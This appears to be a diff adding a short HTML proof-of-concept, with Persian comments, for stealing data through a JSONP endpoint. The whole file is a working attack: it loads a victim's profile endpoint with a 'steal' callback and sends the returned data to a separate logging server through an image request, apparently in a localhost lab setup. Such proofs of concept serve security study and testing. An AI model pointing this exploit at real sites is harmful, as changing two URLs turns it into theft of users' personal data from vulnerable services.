@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>JSONP Exploit</title>
+</head>
+<body>
+<h1>PoC JSONP Data Theft</h1>
+
+<script>
+// تابعی که JSONP قربانی رو می‌گیره
+function steal(data) {
+    // ارسال اطلاعات به سرور خودت
+    var img = new Image();
+    img.src = "http://localhost:5500/log?data=" + encodeURIComponent(JSON.stringify(data));
+    document.body.innerHTML += "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+}
+</script>
+
+<!-- اینجا اسکریپت JSONP هدف لود میشه -->
+<script src="http://localhost:3000/profile?callback=steal"></script>
+
+</body>
+</html>
